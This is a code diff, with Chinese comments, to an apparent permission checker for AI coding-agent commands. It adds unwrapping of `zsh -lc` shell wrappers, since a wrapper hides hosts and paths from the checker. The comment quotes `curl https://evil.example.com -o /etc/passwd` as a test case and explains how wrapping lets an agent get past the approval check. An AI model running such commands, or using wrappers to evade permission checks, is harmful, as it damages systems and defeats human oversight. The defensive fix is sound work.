@@ -35,6 +35,30 @@ const OPAQUE_PATTERNS: readonly (readonly [RegExp, string])[] = [
 
 const SEPARATOR = /(?:&&|\|\||;|\||\n)/
 
+/**
+ * shell 包壳：`/bin/zsh -lc '真正的命令'`。
+ *
+ * **不剥掉的话判定器是瞎的。** codex 把每一条命令都包成这个形状，
+ * 于是分词器只看到 `["/bin/zsh", "-lc", "真正的命令整串"]`：
+ *
+ * - 签名变成 `/bin/zsh`——勾一次「始终允许」等于放行**今后所有 shell 命令**
+ * - `hosts` / `paths` 全空——「写到工作区外」「访问外部网络」这些红线
+ *   对 codex 的每一条命令都失明
+ *
+ * 实测对照（`curl https://evil.example.com -o /etc/passwd`）：
+ * 裸命令 → `hosts=["evil.example.com"] paths=["/etc/passwd"] sig=["curl"]`；
+ * 包壳后 → `hosts=[] paths=[] sig=["/bin/zsh"]`。
+ *
+ * 放在这里而不是 codex 驱动里：任何一家用包壳的引擎都会遇到同一个问题，
+ * 修在共同的解析入口上才不用每接一家补一次。
+ */
+const SHELL_WRAPPER = /^\S*(?:^|\/)?(?:sh|bash|zsh|dash|ksh)\s+-[a-z]*c\s+(['"])([\s\S]*)\1$/
+
+/** 剥掉一层包壳；不是包壳就原样返回。只剥一层——嵌套包壳本身就该人工看。 */
+export function unwrapShell(command: string): string {
+  return SHELL_WRAPPER.exec(command.trim())?.[2] ?? command
+}
+
 /** 带子命令的程序——签名要带上子命令才有区分度（`git push` vs `git status`）。 */
 const SUBCOMMAND_PROGRAMS: ReadonlySet<string> = new Set([
   "git", "npm", "pnpm", "yarn", "bun", "cargo", "go", "docker", "kubectl",
@@ -62,7 +86,9 @@ function toSegment(text: string): Segment | undefined {
   }
 }
 
-export function splitSegments(command: string): SplitResult {
+export function splitSegments(raw: string): SplitResult {
+  // 先剥壳再判：包在 `zsh -lc '...'` 里的 `$(...)` 也必须被认出来
+  const command = unwrapShell(raw)
   for (const [pattern, label] of OPAQUE_PATTERNS) {
     if (pattern.test(command)) {
       return { segments: [], unparseable: true, reason: `命令含${label}，无法静态判定` }
